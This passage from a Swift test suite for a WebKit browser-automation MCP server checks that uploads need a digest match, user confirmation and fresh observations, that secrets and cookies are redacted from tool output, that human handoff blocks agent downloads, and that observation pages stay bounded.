      server, id: 1, name: "browser_observe", arguments: ["session_id": session])
    let initialObservation = try object(try object(initial["result"])["structuredContent"])
    let menu = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": session,
        "observation_id": .string(try string(initialObservation["observationID"])),
        "element_id": .string(try elementID(in: initialObservation, named: "Ajouter")),
        "operation": .string("click"), "approval_mode": .string("native"),
        "idempotency_key": .string("open-creative-menu"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"),
          "value": .string("Charger des ressources créatives"),
        ]),
      ])
    #expect(try object(menu["result"])["isError"] != .bool(true))
    #expect(!runtime.isFilePickerVisible())
    if suppressGestureReceipt {
      runtime.webView.configuration.userContentController.removeScriptMessageHandler(
        forName: "webkituiNativeGesture", contentWorld: .world(name: "WebKitUIMCP.Instrumentation"))
    }
    let observed = try await toolCall(
      server, id: 3, name: "browser_observe", arguments: ["session_id": session])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 4, name: "browser_upload",
      arguments: [
        "session_id": session,
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(
          try elementID(in: observation, named: "Charger des ressources créatives")),
        "idempotency_key": .string("four-creatives"),
        "file_paths": .array(files.map { .string($0.path) }),
        "expected_sha256": .array(digests.map(JSONValue.string)),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("26 ressources"),
        ]),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] != .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["file_selected"] == .bool(true))
    #expect(structured["confirmed_digests_match"] == .string("true"))
    let receipt = try object(structured["file_upload_receipt"])
    #expect(receipt["fileCount"] == .int(4))
    #expect(receipt["filenames"] == .array(files.map { .string($0.lastPathComponent) }))
    #expect(receipt["sha256"] == .array(digests.map(JSONValue.string)))
    #expect(!String(describing: result).contains(directory.path))
    #expect(!runtime.hasArmedUploadSelection())
    #expect(presenter.requests.count == 2)
    if suppressGestureReceipt {
      #expect(structured["dispatch_error"] == .string("nativeGestureReceiptUnavailable"))
      #expect(structured["action_state"] == .string("verified_by_immediate_reconciliation"))
      #expect(structured["trusted_gesture_state"] != .string("trusted"))
    }
    let readback =
      try await runtime.webView.evaluateJavaScript(
        "Array.from(document.querySelector('input').files,f=>f.name)") as? [String]
    #expect(readback == files.map(\.lastPathComponent))
    let reread = try await toolCall(
      server, id: 5, name: "browser_observe", arguments: ["session_id": session])
    let finalObservation = try object(try object(reread["result"])["structuredContent"])
    #expect(try elementID(in: finalObservation, named: "26 ressources").isEmpty == false)
  }

  @Test("Upload refuses a digest that does not match the local file before confirming")
  func uploadRejectsMismatchedDigestBeforeConfirmation() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("icon.png")
    try Data("real-bytes".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>No asset</h1><input aria-label='Icon' type='file'>",
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("digest-mismatch-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try fileControlID(in: observation, labelled: "Icon")),
        "file_paths": .array([.string(file.path)]),
        "expected_sha256": .array([.string(String(repeating: "a", count: 64))]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded icon.png"),
        ]),
      ])
    #expect(response["error"] != nil)
    #expect(presenter.requests.isEmpty)
    #expect(!runtime.hasArmedUploadSelection())
  }

  @Test("A declined upload confirmation arms nothing and attaches nothing")
  func declinedUploadAttachesNothing() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("screenshot.png")
    try Data("declined".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>No asset</h1><input aria-label='Screenshot' type='file'>",
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("declined-upload-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try fileControlID(in: observation, labelled: "Screenshot")),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded screenshot.png"),
        ]),
      ])
    #expect(try object(response["result"])["isError"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(!runtime.hasArmedUploadSelection())
    let count =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('input').files.length") as? Int
    #expect(count == 0)
  }

  @Test("Upload requires a postcondition and a freshly observed target")
  func uploadRequiresPostconditionAndFreshTarget() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("asset.png")
    try Data("asset".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>No asset</h1><input aria-label='Asset' type='file'>",
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(observation["observationID"])
    let elementID = try fileControlID(in: observation, labelled: "Asset")

    let missingPostcondition = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("no-postcondition-01"),
        "observation_id": .string(observationID),
        "element_id": .string(elementID),
        "file_paths": .array([.string(file.path)]),
      ])
    #expect(missingPostcondition["error"] != nil)

    let staleObservation = try await toolCall(
      server, id: 3, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("stale-observation-01"),
        "observation_id": .string(UUID().uuidString),
        "element_id": .string(elementID),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded asset.png"),
        ]),
      ])
    #expect(staleObservation["error"] != nil)
    #expect(presenter.requests.isEmpty)
    #expect(!runtime.hasArmedUploadSelection())
  }

  @Test("An approved selection never outlives a target that opened no file panel")
  func approvedSelectionNeverOutlivesItsTarget() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("private-asset.png")
    try Data("must-not-leak".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    // The approved target is a text input: clicking it opens no file panel, so the
    // approved selection has nothing to be consumed by.
    _ = try await runtime.loadHTML(
      """
      <h1>No asset</h1>
      <input aria-label="Not a file control" type="text">
      <input aria-label="Site owned" type="file">
      """,
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    _ = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("no-panel-target-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try fileControlID(in: observation, labelled: "Not a file control")),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded private-asset.png"),
        ]),
      ])

    #expect(!runtime.hasArmedUploadSelection())
    // A panel the site opens afterwards must receive nothing.
    _ = try? await runtime.webView.evaluateJavaScript(
      "document.querySelectorAll('input')[1].click()")
    try await Task.sleep(for: .milliseconds(150))
    let count =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelectorAll('input')[1].files.length") as? Int
    #expect(count == 0)
  }

  @Test("Session status names the origins a profile is already signed in to")
  func statusNamesAuthenticatedOrigins() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    defer { try? registry.close(handle) }
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<p>Portal</p>", baseURL: URL(string: "https://fixture.invalid/")!,
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let secret = "authenticated-origin-cookie-secret"
    let cookie = try #require(
      HTTPCookie(properties: [
        .domain: "console.fixture.invalid", .path: "/", .name: "session",
        .value: secret, .secure: "TRUE",
      ]))
    await runtime.webView.configuration.websiteDataStore.httpCookieStore.setCookie(cookie)

    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("status"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])
    let origins = try array(structured["authenticated_origins"]).map { try string($0) }
    #expect(origins.contains("console.fixture.invalid"))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(secret))
  }

  @Test("A file swapped after confirmation is reported, not sent silently")
  func swappedFileAfterConfirmationIsReported() async throws {
    let sent = JSONValue.object([
      "structuredContent": .object([
        "file_upload_receipt": .object(["sha256": .array([.string("aaa"), .string("bbb")])])
      ])
    ])
    let matching = WebKitMCPServer.annotatingConfirmedDigests(sent, confirmed: ["aaa", "bbb"])
    #expect(
      try object(object(matching)["structuredContent"])["confirmed_digests_match"]
        == .string("true"))

    let swapped = WebKitMCPServer.annotatingConfirmedDigests(sent, confirmed: ["aaa", "ccc"])
    let swappedContent = try object(object(swapped)["structuredContent"])
    #expect(swappedContent["confirmed_digests_match"] == .string("false"))
    #expect(swappedContent["confirmed_digests"] == .array([.string("aaa"), .string("ccc")]))

    // No receipt at all must not read as a match.
    let none = WebKitMCPServer.annotatingConfirmedDigests(
      .object(["structuredContent": .object([:])]), confirmed: ["aaa"])
    #expect(
      try object(object(none)["structuredContent"])["confirmed_digests_match"]
        == .string("no_receipt"))
  }

  @Test("Profiles state the single host lease before any session is opened")
  func profilesStateTheHostLeaseUpFront() async throws {
    // A client could previously learn that the host allows one session only from a
    // successful open, so it could not tell contention from failure.
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("profiles")])
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(structured["maximum_sessions"] == .int(1))
    let lease = try object(structured["host_lease"])
    #expect(lease["exclusive"] == .bool(true))
    #expect(try string(lease["state"]).count > 0)
    #expect(try string(lease["remediation"]).count > 0)
  }

  @Test("A disconnected client releases its session and the host lease")
  func disconnectedClientReleasesTheLease() async throws {
    // A per-connection server that ends without releasing leaves the session open in
    // the durable registry, holding the single host lease under a holder that names
    // the broker itself. Nothing inside MCP can then free it.
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-release-\(UUID().uuidString)", isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let registry = try WebKitSessionRegistry(
      enforceHostExclusiveSession: true,
      hostControllerLockURL: directory.appendingPathComponent("controller.lock"))
    let server = WebKitMCPServer(registry: registry)
    _ = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    #expect(registry.count == 1)

    await server.relinquishClientResources()
    #expect(registry.count == 0)
    #expect(registry.externalHostControllerHolder() == nil)
  }

  @Test("open accepts the width and height its schema advertises and sizes the viewport")
  func openAppliesRequestedViewport() async throws {
    // AuroraPulse session, 2026-09-30: open refused them, then set_viewport was needed.
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("open"), "width": .int(1500), "height": .int(1400),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == nil)
    let structured = try object(result["structuredContent"])
    let viewport = try object(structured["viewport"])
    #expect(viewport["width"] == .int(1500))
    #expect(viewport["height"] == .int(1400))

    let refused = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: ["operation": .string("open"), "width": .int(10)])
    #expect(try object(refused["error"])["code"] == .int(-32602))
  }

  @Test("Download reports an active human handoff without attempting the action")
  func downloadReportsHumanControl() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<p>Portal</p>",
      baseURL: URL(string: "https://fixture.invalid/")!,
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    try runtime.requestHumanHandoff()
    try runtime.beginHumanControl(presentWindow: false)
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("download-during-handoff"),
        "url": .string("https://fixture.invalid/profile"),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("human_control_active"))
    #expect(structured["control_state"] == .string("human_controlled"))
    #expect(structured["download_started"] == .bool(false))
    #expect(structured["resume_required"] == .bool(true))
    #expect(presenter.requests.isEmpty)
  }

  @Test("Page scrolling, element scrolling, and virtual text reads are bounded")
  func scrollingAndTextReading() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      """
      <div role='log' aria-label='Build log' style='height:80px;overflow:auto'>
        <pre>line one\nline two\nline three</pre>
      </div>
      <div style='height:1600px'></div>
      <button aria-label='Bottom action'>Bottom</button>
      """,
      baseURL: URL(string: "https://fixture.invalid/scroll"),
      timeout: .seconds(5), quietWindow: .milliseconds(40))

    let textRead = try await toolCall(
      server, id: 2, name: "browser_read_text",
      arguments: ["session_id": .string(sessionID), "maximum_characters": .int(2_000)])
    let text = try object(try object(textRead["result"])["structuredContent"])
    #expect(try string(text["bodyText"]).contains("line one"))
    #expect(!(try array(text["regions"])).isEmpty)

    let observed = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let elements = try array(observation["elements"])
    let bottom = try #require(elements.last)
    let elementID = try string(try object(bottom)["elementID"])
    let elementScroll = try await toolCall(
      server, id: 4, name: "element_scroll_into_view",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(elementID),
      ])
    let elementScrollResult = try object(
      try object(elementScroll["result"])["structuredContent"])
    #expect(elementScrollResult["observationInvalidated"] == .bool(true))

    let pageScroll = try await toolCall(
      server, id: 5, name: "browser_scroll",
      arguments: ["session_id": .string(sessionID), "delta_y": .int(-500)])
    let pageScrollResult = try object(try object(pageScroll["result"])["structuredContent"])
    #expect(pageScrollResult["observationInvalidated"] == .bool(true))
  }

  @Test("Observation pagination and semantic field budgets are server enforced")
  func boundedObservationPages() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      """
      <button aria-label="First action with a deliberately long accessible name">First</button>
      <button aria-label="Second action with a deliberately long accessible name">Second</button>
      <button aria-label="Third action with a deliberately long accessible name">Third</button>
      """,
      baseURL: URL(string: "https://fixture.invalid/observation-pages"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    let firstPage = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID),
        "maximum_elements": .int(1),
        "maximum_field_characters": .int(64),
      ])
    let first = try object(try object(firstPage["result"])["structuredContent"])
    #expect(first["totalElementCount"] == .int(3))
    #expect(first["elementOffset"] == .int(0))
    #expect(first["nextElementOffset"] == .int(1))
    #expect((try array(first["elements"])).count == 1)

    let finalPage = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID),
        "maximum_elements": .int(2),
        "element_offset": .int(2),
        "maximum_field_characters": .int(64),
      ])
    let final = try object(try object(finalPage["result"])["structuredContent"])
    #expect(final["elementOffset"] == .int(2))
    #expect(final["nextElementOffset"] == nil)
    #expect((try array(final["elements"])).count == 1)
  }

  @Test("Default observation pages remain within the one mebibyte wire budget")
  func defaultObservationWireBudget() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    let longName = String(repeating: "bounded semantic field ", count: 40)
    let markup = (0..<300).map { index in
      "<button aria-label='\(longName)\(index)'>Action \(index)</button>"
    }.joined()
    _ = try await runtime.loadHTML(
      markup,
      baseURL: URL(string: "https://fixture.invalid/default-wire-budget"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    let response = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let structured = try object(try object(response["result"])["structuredContent"])
    let encoded = try JSONEncoder().encode(response)

    #expect(structured["totalElementCount"] == .int(300))
    #expect(structured["nextElementOffset"] == .int(150))
    let elements = try array(structured["elements"])
    #expect(elements.count == 150)
    #expect(try object(elements[0])["locatorRecipe"] == nil)
    #expect(try object(elements[0])["locatorQuality"] != nil)
    #expect(try object(elements[0])["contentEditable"] == nil)
    #expect(try object(elements[0])["fillCapability"] == nil)
    #expect(encoded.count <= 1_048_576)
  }

  @Test("A settled document with no rendered content is explicit and actionable")
  func readyButEmptyDocumentIsExplicit() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    let navigation = try await runtime.loadHTML(
      """
      <!doctype html><title>Contact Us - Fixture</title>
      <script>
        const transientShell = document.createElement('div');
        document.body.append(transientShell);
        transientShell.remove();
      </script>
      """,
      baseURL: URL(string: "https://fixture.invalid/contact/solution/select"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    #expect(navigation.readiness == .ready)
    #expect(navigation.mutationCount > 0)
    #expect(navigation.contentState == .emptyOrUnusable)

    let observed = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    #expect(observation["totalElementCount"] == .int(0))
    #expect(observation["content_state"] == .string("empty_or_unusable"))
    #expect(observation["status"] == .string("document_empty_or_unusable"))
    #expect(try string(observation["safe_next_step"]).contains("Do not infer"))

    let compact = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(sessionID), "compact": .bool(true)])
    let compactObservation = try object(try object(compact["result"])["structuredContent"])
    #expect(compactObservation["content_state"] == .string("empty_or_unusable"))
    #expect(compactObservation["status"] == .string("document_empty_or_unusable"))

    let read = try await toolCall(
      server, id: 4, name: "browser_read_text",
      arguments: ["session_id": .string(sessionID)])
    let text = try object(try object(read["result"])["structuredContent"])
    #expect(text["bodyText"] == .string(""))
    #expect(text["content_state"] == .string("empty_or_unusable"))
  }

  @Test("Compact state attributes and picker capabilities match full sanitized evidence")
  func compactStateAndFillCapabilities() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <button aria-expanded='false' onclick="this.setAttribute('aria-expanded','true')">Duo</button>
      <input role='combobox' aria-label='Readonly picker' readonly>
      <input aria-label='Token name' name='token_name'>
      <input aria-label='Secret token' value='synthetic-wire-secret-640' aria-expanded='true'>
      """, baseURL: URL(string: "https://fixture.invalid/compact-states"),
      timeout: .seconds(15), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let compact = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: [
        "session_id": session, "compact": .bool(true),
        "fields": .array([.string("name"), .string("state")]),
      ])
    let observation = try object(try object(compact["result"])["structuredContent"])
    let rows = try array(observation["elements"]).map { try object($0) }
    #expect(try object(rows[0]["stateAttributes"])["aria-expanded"] == .string("false"))
    #expect(rows[1]["fillCapability"] == .string("readonly"))
    #expect(rows[2]["fillCapability"] == .string("editable"))
    #expect(rows[2]["sensitive"] == .bool(false))
    #expect(rows[3]["fillCapability"] == .string("sensitive"))
    #expect(rows[3]["stateAttributes"] == .object([:]))
    let refused = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": rows[1]["elementID"]!, "operation": .string("fill"),
        "value": .string("no typing"), "idempotency_key": .string("readonly-picker-640"),
        "approval_mode": .string("native"),
      ])
    #expect(refused["error"] != nil || (try? object(refused["result"])["isError"]) == .bool(true))
    #expect(presenter.requests.isEmpty)
    let inspected = try await toolCall(
      server, id: 3, name: "browser_inspect_element",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": rows[0]["elementID"]!,
      ])
    let inspection = try object(try object(inspected["result"])["structuredContent"])
    #expect(try object(inspection["stateAttributes"])["aria-expanded"] == .string("false"))
    let acted = try await toolCall(
      server, id: 4, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": rows[0]["elementID"]!, "operation": .string("click"),
        "idempotency_key": .string("expand-duo-640"), "approval_mode": .string("native"),
        "postcondition": .object([
          "type": .string("attribute_equals"),
          "attribute": .string("aria-expanded"), "value": .string("true"),
        ]),
      ])
    #expect(try object(acted["result"])["isError"] != .bool(true))
    #expect(presenter.requests.count == 1)
    let full = try await toolCall(
      server, id: 5, name: "browser_observe",
      arguments: [
        "session_id": session, "compact": .bool(false),
      ])
    let fullObservation = try object(try object(full["result"])["structuredContent"])
    let fullRows = try array(fullObservation["elements"]).map { try object($0) }
    let expanded = try object(try object(fullRows[0]["stateAttributes"])["aria-expanded"])
    #expect(try object(try array(expanded["segments"])[0])["text"] == .string("true"))
    #expect(fullObservation["observationID"] != observation["observationID"])
    for response in [compact, inspected, full, acted] {
      #expect(
        !String(decoding: try JSONEncoder().encode(response), as: UTF8.self)
          .contains("synthetic-wire-secret-640"))
    }
    let filtered = try await toolCall(
      server, id: 6, name: "browser_observe",
      arguments: [
        "session_id": session, "compact": .bool(true), "fields": .array([.string("name")]),
      ])
    let filteredObservation = try object(try object(filtered["result"])["structuredContent"])
    #expect(try object(try array(filteredObservation["elements"])[0])["stateAttributes"] == nil)
  }

  @Test("An editable controlled picker rejecting text stays indeterminate and is never replayed")
  func controlledPickerRejectionIsNotSuccess() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <input role='combobox' aria-label='Bucket picker' value='Existing choice'
        oninput="window.inputCount=(window.inputCount||0)+1;this.value='Existing choice'">
      """, baseURL: URL(string: "https://fixture.invalid/controlled-picker"),
      timeout: .seconds(15), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: [
        "session_id": session
      ])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let row = try object(try array(observation["elements"])[0])
    #expect(row["fillCapability"] == .string("editable"))
    let arguments: [String: JSONValue] = [
      "session_id": session, "observation_id": observation["observationID"]!,
      "element_id": row["elementID"]!, "operation": .string("fill"),
      "value": .string("Different choice"), "idempotency_key": .string("controlled-picker-640"),
      "approval_mode": .string("native"),
    ]
    let acted = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let receipt = try object(try object(acted["result"])["structuredContent"])
    #expect(receipt["action_state"] == .string("dispatched_verification_indeterminate"))
    #expect(receipt["action_replayed"] == .bool(false))
    let count = try await runtime.webView.evaluateJavaScript("window.inputCount") as? Int
    #expect((count ?? 0) > 0)
    let repeated = try await toolCall(server, id: 3, name: "browser_act", arguments: arguments)
    let refusal = try object(try object(repeated["result"])["structuredContent"])
    #expect(refusal["code"] == .string("idempotency_key_already_used"))
    #expect(refusal["automatic_retry_allowed"] == .bool(false))
    let afterCount = try await runtime.webView.evaluateJavaScript("window.inputCount") as? Int
    #expect(afterCount == count)
    #expect(presenter.requests.count == 1)
  }

  @Test(
    "Handoff operations reject foreign timing/shape parameters before any prompt",
    arguments: [
      "handoff", "handoff_start", "handoff_status", "handoff_resume", "handoff_focus",
      "confirmation_focus", "confirmation_cancel", "compatibility_start", "client_handoff",
    ])
  func handoffArgumentMatrix(operation: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string(operation), "session_id": .string(handle.rawValue.uuidString),
        "timeout_ms": .int(1000),
      ])
    #expect(response["error"] != nil || (try? object(response["result"])["isError"]) == .bool(true))
    #expect(presenter.requests.isEmpty)
    #expect(try registry.runtime(for: handle).interactionControlState() == .agentControlled)
  }

  @Test("Modern compact observations factor provenance and avoid duplicate JSON text")
  func compactObservation() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      """
      <section aria-label="API Tokens"><h2>API Tokens</h2>
        <a href="/tokens?team=private-value">Open</a>
      </section>
      """,
      baseURL: URL(string: "https://fixture.invalid/settings"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    let response = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID),
        "compact": .bool(true),
        "fields": .array([
          .string("role"), .string("name"), .string("href"), .string("context"),
          .string("locator_quality"),
        ]),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])
    #expect(structured["compact"] == .bool(true))
    #expect(try object(structured["document"])["provenance"] != nil)
    let rows = try array(structured["elements"])
    let row = try object(
      try #require(
        rows.first { value in
          (try? object(value)["role"]) == .string("link")
        }))
    #expect(row["role"] == .string("link"))
    #expect(row["href"] == .string("https://fixture.invalid/tokens?team=<redacted>"))
    #expect(row["locatorQuality"] != nil)
    let contentRows = try array(result["content"])
    let content = try object(contentRows[0])
    #expect(content["text"] == .string("Compact structured result available in structuredContent."))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains("private-value"))

    let inspected = try await toolCall(
